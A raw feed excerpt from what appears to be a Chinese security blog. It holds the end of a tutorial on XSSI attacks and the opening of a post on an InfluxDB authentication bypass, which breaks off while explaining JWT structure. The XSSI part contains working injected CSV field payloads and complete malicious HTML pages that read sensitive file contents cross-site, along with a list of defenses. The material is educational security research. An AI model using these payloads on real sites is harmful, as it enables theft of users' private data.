class="headerlink" title="利用敏感文件中的可控字段窃取数据"></a>利用敏感文件中的可控字段窃取数据</h4><h5 id="CSV-with-quotations-thef"><a href="#CSV-with-quotations-thef" class="headerlink" title="CSV with quotations thef"></a>CSV with quotations thef</h5><p>简单地说，就是CSV文件中的敏感内容被双引号括起来了，这样的话前面针对CSV的操作就没用了。但是如果我们能够控制CSV文件中某些项的值，那么还是可以进行信息窃取的，而且一般我们进行CSV文件导出之前、我们是可以设置我们想导出的项以及内容的。</p><p>注意，该方法目前仅适用于全版本的IE，不适用于Chrome和Firefox。</p><p>假设CSV文件如下，其中有两处地方可控：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1,&quot;可控&quot;,&quot;123@123.com&quot;,&quot;03-0000-0001&quot;</span><br><span class="line">2,&quot;admin&quot;,&quot;456@456.com&quot;,&quot;03-0000-0002&quot;</span><br><span class="line">3,&quot;guest&quot;,&quot;789@789.com&quot;,&quot;03-0000-0003&quot;</span><br><span class="line">4,&quot;tester&quot;,&quot;abc@abc.com&quot;,&quot;03-0000-0004&quot;</span><br><span class="line">5,&quot;可控&quot;,&quot;def@def.com&quot;,&quot;03-0000-0005&quot;</span><br></pre></td></tr></table></figure><p>此时，我们可以通过可控的项来构造如下的CSV文件，先注入个双引号闭合掉前面的引号，然后使用<code>mi1k7ea=function() {/*…*/}</code>来解决多行的问题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1,&quot;a&quot;,mi1k7ea=function()&#123;/*&quot;,&quot;123@123.com&quot;,&quot;03-0000-0001&quot;</span><br><span class="line">2,&quot;admin&quot;,&quot;456@456.com&quot;,&quot;03-0000-0002&quot;</span><br><span class="line">3,&quot;guest&quot;,&quot;789@789.com&quot;,&quot;03-0000-0003&quot;</span><br><span class="line">4,&quot;tester&quot;,&quot;abc@abc.com&quot;,&quot;03-0000-0004&quot;</span><br><span class="line">5,&quot;*/&#125;//&quot;,&quot;def@def.com&quot;,&quot;03-0000-0005&quot;</span><br></pre></td></tr></table></figure><p>xssi.html，调用mi1k7ea.toString()获取函数源码来达到攻击目标数据的目的：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--恶意页面--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.10.131:81/a.csv"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">alert(mi1k7ea.toString());</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在IE 11中测试成功：</p><p><img src="/2020/01/04/浅析XSSI漏洞/25.png" alt=""></p><p>为啥能成功执行？我们将CSV文件内容直接放到IE的Console中运行，浏览器是能够成功识别为JS代码并定义了一个名为mi1k7ea的JS函数：</p><p><img src="/2020/01/04/浅析XSSI漏洞/26.png" alt=""></p><p>也就是说，<strong>通过可控字段构造CSV文件的目的就是为了让文件内容使浏览器能够正常识别为JS代码，并且将中间的敏感信息都注释掉，然后通过调用toString()函数来获取JS函数源码从而成功窃取敏感信息。</strong></p><p>其实前面那段CSV内容放到Chrome和Firefox中都能成功识别为JS的，结果和IE的一样，但为啥不能在XSSI中利用呢？——原因在于目前较新版本的Chrome和Firefox都已经将MIME类型为<code>text/csv</code>的响应都自动拦截掉了，因此无法成功利用：</p><p><img src="/2020/01/04/浅析XSSI漏洞/27.png" alt=""></p><h5 id="利用ECMAScript6特性——‘-’反引号"><a href="#利用ECMAScript6特性——‘-’反引号" class="headerlink" title="利用ECMAScript6特性——‘`’反引号"></a>利用ECMAScript6特性——‘`’反引号</h5><p>业界研究的这种技巧，是针对Chrome和Firefox的利用的，因为，但是在目前的Chrome和Firefox中已经不再能成功利用，原因如前面所说，Chrome和Firefox都已经将MIME类型为<code>text/csv</code>的响应都自动拦截掉了。</p><p>但是我们还是来看下这个原理和利用吧。</p><p>假设目标CSV文件如下，其中’Sample report’这个字段是我们可以控制的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">report_id,report_title,program_name,total_amount,amount,bonus_amount,currency,awarded_at,status</span><br><span class="line">1234,Sample report,Sample Program,100.0,100.0,0.0,USD,2017-01-01 12:30:00 UTC,confirmed</span><br><span class="line">1234,Sample report,Sample Program,100.0,100.0,0.0,USD,2017-01-01 12:30:00 UTC,confirmed</span><br><span class="line">1234,Sample report,Sample Program,100.0,100.0,0.0,USD,2017-01-01 12:30:00 UTC,confirmed</span><br></pre></td></tr></table></figure><p> 然后我们构造如下，将’Sample’作为JS变量，变量内容未反引号括起来的内容，最后需要注释掉后面部分的内容才能使浏览器识别JS不会报错：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">report_id,report_title,program_name,total_amount,amount,bonus_amount,currency,awarded_at,status</span><br><span class="line">1234,Sample=` report,Sample Program,100.0,100.0,0.0,USD,2017-01-01 12:30:00 UTC,confirmed</span><br><span class="line">1234,Sample report,Sample Program,100.0,100.0,0.0,USD,2017-01-01 12:30:00 UTC,confirmed</span><br><span class="line">1234,Sample`// report,Sample Program,100.0,100.0,0.0,USD,2017-01-01 12:30:00 UTC,confirmed</span><br></pre></td></tr></table></figure><p>xssi.html，注意定义CSV中第一行的项为变量：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--恶意页面--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> report_id,report_title,program_name,total_amount,amount,bonus_amount,currency,awarded_at;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.10.131:81/a.csv"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">alert(Sample.toString());</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在Chrome或Firefox上测试是不成功的，原因同上：</p><p><img src="/2020/01/04/浅析XSSI漏洞/29.png" alt=""></p><p>但是这段CSV在Firefox和Chrome上的Console上是能成功识别并执行的，也就是说构造本身是没问题的：</p><p><img src="/2020/01/04/浅析XSSI漏洞/32.png" alt=""></p><h5 id="利用ECMAScript6特性——箭头函数"><a href="#利用ECMAScript6特性——箭头函数" class="headerlink" title="利用ECMAScript6特性——箭头函数"></a>利用ECMAScript6特性——箭头函数</h5><p>a.csv，假设num和b项可控：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">name,num,team</span><br><span class="line">Jordan,23,Bull</span><br><span class="line">Kobe,24,Laker</span><br><span class="line">James,23,Laker</span><br><span class="line">Iversion,3,76er</span><br><span class="line">a,b,c</span><br></pre></td></tr></table></figure><p>构造如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">name,num=i=&gt;/*,team</span><br><span class="line">Jordan,23,Bull</span><br><span class="line">Kobe,24,Laker</span><br><span class="line">James,23,Laker</span><br><span class="line">Iversion,3,76er</span><br><span class="line">a,b*/i//,c</span><br></pre></td></tr></table></figure><p>xssi.html：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--恶意页面--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> report_id,report_title,program_name,total_amount,amount,bonus_amount,currency,awarded_at;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.10.131:81/a.csv"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">alert(num.toString());</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在Chrome和Firefox上运行会报错，原因同上。</p><p>但是这段CSV在Firefox和Chrome上的Console上是能成功识别并执行的，也就是说构造本身是没问题的：</p><p><img src="/2020/01/04/浅析XSSI漏洞/33.png" alt=""></p><h5 id="窃取非JS、非CSV类型文件敏感信息"><a href="#窃取非JS、非CSV类型文件敏感信息" class="headerlink" title="窃取非JS、非CSV类型文件敏感信息"></a>窃取非JS、非CSV类型文件敏感信息</h5><p>前面三种方法，对于现在较新版本的Chrome和Firefox都是失效，但是如果目标文件类型并非是JS/CSV的话，就能够通过可控字段来构造文件内容实现在Chrome和Firefox上的执行，这是因为响应的MIME类型并非<code>text/csv</code>，也就不会被浏览器所拦截了。</p><p>比如前面的三种方法中，将a.csv改为a.txt，在Chrome和Firefox上能成功执行：</p><p><img src="/2020/01/04/浅析XSSI漏洞/28.png" alt=""></p><p><img src="/2020/01/04/浅析XSSI漏洞/30.png" alt=""></p><p><img src="/2020/01/04/浅析XSSI漏洞/31.png" alt=""></p><p>在前面的第二种方法中，还有一种构造形式，即将Sample后面的=等号去掉，也就是说直接将Sample当成函数进行定义，a.txt如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">report_id,report_title,program_name,total_amount,amount,bonus_amount,currency,awarded_at,status</span><br><span class="line">1234,Sample` report,Sample Program,100.0,100.0,0.0,USD,2017-01-01 12:30:00 UTC,confirmed</span><br><span class="line">1234,Sample report,Sample Program,100.0,100.0,0.0,USD,2017-01-01 12:30:00 UTC,confirmed</span><br><span class="line">1234,Sample`// report,Sample Program,100.0,100.0,0.0,USD,2017-01-01 12:30:00 UTC,confirmed</span><br></pre></td></tr></table></figure><p>xssi.html修改如下，直接获取Sample函数的参数内容：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--恶意页面--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> report_id,report_title,program_name,total_amount,amount,bonus_amount,currency,awarded_at;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">Sample</span><span class="params">(strings)</span></span>&#123;</span></span><br><span class="line"><span class="undefined">alert(strings);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.10.131:81/a.txt"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样同样能利用成功。</p><p>参照这些例子，同理去挖掘即可。</p><h3 id="网上的案例"><a href="#网上的案例" class="headerlink" title="网上的案例"></a>网上的案例</h3><p>Yahoo的XSSI，窃取动态JS文件中的session值，进而窃取受害者账号的具体信息：<a href="https://www.freebuf.com/articles/web/179851.html" target="_blank" rel="noopener">挖洞经验 | 看我如何发现雅虎XSSi漏洞实现用户信息窃取</a></p><p>Hackerone的XSSI，CSV文件内容的窃取以及非JS非CSV类型文件内容的窃取：<a href="https://www.anquanke.com/post/id/86173" target="_blank" rel="noopener">【技术分享】hackerone漏洞：如何利用XSSI窃取多行字符串（含演示视频）</a></p><p><a href="https://v.youku.com/v_show/id_XMjc4NjEwNTczMg==.html?refer=seo_operation.liuxiao.liux_00003311_3000_QfMVj2_19042900" target="_blank" rel="noopener">演示视频</a></p><h2 id="0x04-防御"><a href="#0x04-防御" class="headerlink" title="0x04 防御"></a>0x04 防御</h2><ul><li>开发者永远也不要把敏感数据放在JavaScript文件中， 也不要放在JSONP中；</li><li>请求敏感文件/响应的尽量改为POST方式；</li><li>使用类似于CSRF-Token机制；</li><li>设置响应头为<code>X-Content-Type-Options: nosniff</code>，此时浏览器就会拒绝加载JS类型的数据；</li></ul><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://vulncity.com/archives/14/" target="_blank" rel="noopener">使用XSSI攻击获取敏感信息</a></p><p><a href="http://drops.wooyun.org/papers/5797" target="_blank" rel="noopener">XSSI攻击利用 – 大学生</a></p><p><a href="https://www.freebuf.com/articles/web/87374.html" target="_blank" rel="noopener">揭开XSSI攻击的神秘面纱</a></p><p><a href="https://www.anquanke.com/post/id/85337" target="_blank" rel="noopener">【技术分享】XSSI： 一个不出名但是影响广泛的Web漏洞</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="XSSI" scheme="https://www.mi1k7ea.com/tags/XSSI/"/>
    
  </entry>
  
  <entry>
    <title>浅析Influxdb认证绕过漏洞</title>
    <link href="https://www.mi1k7ea.com/2020/01/01/%E6%B5%85%E6%9E%90Influxdb%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.mi1k7ea.com/2020/01/01/浅析Influxdb认证绕过漏洞/</id>
    <published>2020-01-01T14:35:17.000Z</published>
    <updated>2020-01-02T12:07:25.307Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-基本概念"><a href="#0x01-基本概念" class="headerlink" title="0x01 基本概念"></a>0x01 基本概念</h2><h3 id="Influxdb简介"><a href="#Influxdb简介" class="headerlink" title="Influxdb简介"></a>Influxdb简介</h3><p>TSDB（Time Series DataBase，时序数据库）是针对时间戳或时间序列数据进行优化的数据库，专门为处理带有时间戳的度量和事件度量而构建的。而时间序列数据可以是随时间跟踪、监视、下采样和聚合的度量或事件，如服务器指标、应用程序性能、网络数据、传感器数据以及许多其他类型的分析数据。</p><p>Influxdb是一个开源的时序数据库，由GO语言编写，用于处理高写入和高查询负载。Influxdb被广泛应用于存储系统的监控数据，IoT行业的实时数据等场景。</p><h3 id="关键特性"><a href="#关键特性" class="headerlink" title="关键特性"></a>关键特性</h3><p>Influxdb具有以下关键特性：</p><ul><li>能够高速读取和压缩时间序列数据</li><li>使用 <code>Go</code> 编写，能够但文件运行，没有依赖</li><li>提供了简单、高效的 <code>HTTP</code> 读写接口</li><li>能够使用插件支持其他的数据协议，如： <code>Graphite=， =collectd</code> 和 <code>OpenTSDB</code></li><li>可轻松使用 <code>SQL</code> 语言查询聚合数据</li><li>能够使用 <code>Tag</code> 进行快速高效的查询</li><li>支持保留策略(<code>Retention Policy</code>), 能够自动清理旧数据</li><li>支持持续查询，能够自动定期计算聚合数据，提高了查询的效率</li></ul><h3 id="与传统数据库的概念比较"><a href="#与传统数据库的概念比较" class="headerlink" title="与传统数据库的概念比较"></a>与传统数据库的概念比较</h3><table><thead><tr><th>Influxdb</th><th>传统数据库</th></tr></thead><tbody><tr><td>database</td><td>数据库</td></tr><tr><td>measurement</td><td>表，但不支持联合查询</td></tr><tr><td>point</td><td>表中的一行数据</td></tr></tbody></table><p>其中point由时间戳（time）、数据（field）、标签（tags）组成，相当于传统数据库里的一行数据：</p><table><thead><tr><th>point属性</th><th>传统数据库中的概念</th></tr></thead><tbody><tr><td>time</td><td>主键</td></tr><tr><td>tags</td><td>有索引的列</td></tr><tr><td>fields</td><td>没索引的列</td></tr></tbody></table><h3 id="目录与文件结构"><a href="#目录与文件结构" class="headerlink" title="目录与文件结构"></a>目录与文件结构</h3><p>Influxdb的数据存储即在其根目录下的database目录中主要有三个目录。默认情况下是meta、wal和data。</p><ul><li>meta目录：用于存储数据库的一些元数据，meta目录下有一个meta.db文件；</li><li>wal目录：存放预写日志文件，以.wal结尾；</li><li>data目录：存放实际存储的数据文件，以.tsm结尾。</li></ul><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>InfluxDB的配置文件为：/etc/influxdb/influxdb.conf</p><p>选项详情请参见：<a href="https://docs.influxdata.com/influxdb/v1.7/administration/config/" target="_blank" rel="noopener">Configuration Settings</a></p><h3 id="常用的InfluxQL语句"><a href="#常用的InfluxQL语句" class="headerlink" title="常用的InfluxQL语句"></a>常用的InfluxQL语句</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 查看所有的数据库</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">databases</span>;</span><br><span class="line"><span class="comment">-- 使用特定的数据库</span></span><br><span class="line"><span class="keyword">use</span> database_name;</span><br><span class="line"><span class="comment">-- 查看所有的measurement</span></span><br><span class="line"><span class="keyword">show</span> measurements;</span><br><span class="line"><span class="comment">-- 查询10条数据</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> measurement_name <span class="keyword">limit</span> <span class="number">10</span>;</span><br><span class="line"><span class="comment">-- 数据中的时间字段默认显示的是一个纳秒时间戳，改成可读格式</span></span><br><span class="line">precision rfc3339; <span class="comment">-- 之后再查询，时间就是rfc3339标准格式</span></span><br><span class="line"><span class="comment">-- 或可以在连接数据库的时候，直接带该参数</span></span><br><span class="line">influx -precision rfc3339</span><br><span class="line"><span class="comment">-- 查看一个measurement中所有的tag key </span></span><br><span class="line"><span class="keyword">show</span> tag <span class="keyword">keys</span></span><br><span class="line"><span class="comment">-- 查看一个measurement中所有的field key </span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">field</span> <span class="keyword">keys</span></span><br><span class="line"><span class="comment">-- 查看一个measurement中所有的保存策略(可以有多个，一个标识为default)</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">retention</span> policies;</span><br></pre></td></tr></table></figure><h3 id="Influxdb函数详解"><a href="#Influxdb函数详解" class="headerlink" title="Influxdb函数详解"></a>Influxdb函数详解</h3><p>参考：<a href="https://tanjiti.github.io/2019/02/20/influxdb函数详解/" target="_blank" rel="noopener">influxdb函数详解</a></p><h3 id="HTTP接口"><a href="#HTTP接口" class="headerlink" title="HTTP接口"></a>HTTP接口</h3><p>Influxdb相关接口具体可参考官方文档：</p><p>下面之看下几个简单的例子。</p><h4 id="query"><a href="#query" class="headerlink" title="/query"></a>/query</h4><p>数据主要使用/query接口查询，下面给出一些常见用法，而更多用法参见：<a href="https://docs.influxdata.com/influxdb/v1.7/guides/querying_data/" target="_blank" rel="noopener">Querying data with the HTTP API</a> 。</p><ul><li><p>创建数据库</p><p>POST请求可用于创建数据库，如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://localhost:8086/query --data-urlencode <span class="string">"q=CREATE DATABASE &lt;databasename&gt;"</span></span><br></pre></td></tr></table></figure></li><li><p>查询</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET http://localhost:8086/query?pretty=<span class="literal">true</span> --data-urlencode <span class="string">'db=&lt;database name&gt;'</span> --data-urlencode <span class="string">'q=SELECT "field1","tag1"... FROM &lt;measurement&gt; WHERE &lt;condition&gt;'</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="write"><a href="#write" class="headerlink" title="/write"></a>/write</h4><p>发送POST请求是写入数据的主要方式，下面给出一些常见用法，而更多用法参见：<a href="https://docs.influxdata.com/influxdb/v1.7/guides/writing_data/" target="_blank" rel="noopener">Writing data with the HTTP API</a> 。</p><ul><li><p>插入一条Point：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://localhost:8086/write?db=&lt;database name&gt; --data-binary <span class="string">"cpu_load,machine=001,region=cn value=0.56 1555164637838240795"</span></span><br></pre></td></tr></table></figure><p>必须指定<code>database name</code></p></li></ul><h3 id="身份认证机制——JWT"><a href="#身份认证机制——JWT" class="headerlink" title="身份认证机制——JWT"></a>身份认证机制——JWT</h3><p>Influxdb支持基于密码的身份认证和基于JWT的身份认证。</p><p>下面详细介绍JWT机制。</p><h4 id="JWT基本原理"><a href="#JWT基本原理" class="headerlink" title="JWT基本原理"></a>JWT基本原理</h4><p>JWT即JSON Web Tokens，是目前最流行的跨域身份验证解决方案。</p><p>JWT的原理就是在服务器身份验证之后，将生成一个JSON对象并将其发送回用户，如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"Username"</span>: <span class="string">"mi1k7ea"</span>,</span><br><span class="line">  <span class="string">"Role"</span>: <span class="string">"Admin"</span>,</span><br><span class="line">  <span class="string">"Expire"</span>: <span class="string">"2020-01-01 00:00:00"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此后，用户与服务端通信时，都要发回这个JSON对象。服务器完全只靠这个对象认定用户身份。为了防止用户篡改数据，服务器在生成这个对象的时候，会加上签名。</p><p>服务器不保存任何session数据，也就是说，服务器变成无状态，从而比较容易实现扩展。</p><h4 id="JWT原理图"><a href="#JWT原理图" class="headerlink" title="JWT原理图"></a>JWT原理图</h4><p>如下：</p><p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/1.png" alt=""></p><h4 id="JWT结构"><a href="#JWT结构" class="headerlink" title="JWT结构"></a>JWT结构</h4><p>一个示例的JWT如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</span><br></pre></td></tr></table></figure><p>这是一个很长的字符串，中间用点<code>.</code>分隔成三个部分。</p><p>一个JWT实际上就是一个字符串，由三部分组成：</p><ul><li>Header（头部）</li><li>Payload（载荷）</li><li>Signature（签名）</li></ul><h5 id="Header（头部）"><a href="#Header（头部）" class="headerlink" title="Header（头部）"></a>Header（头部）</h5><p>Header部分是一个JSON对象，描述JWT的元数据，通常是下面的样子。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"alg"</span>: <span class="string">"HS256"</span>,</span><br><span class="line">  <span class="attr">"typ"</span>: <span class="string">"JWT"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码中，alg属性表示签名的算法（algorithm），默认是HMAC 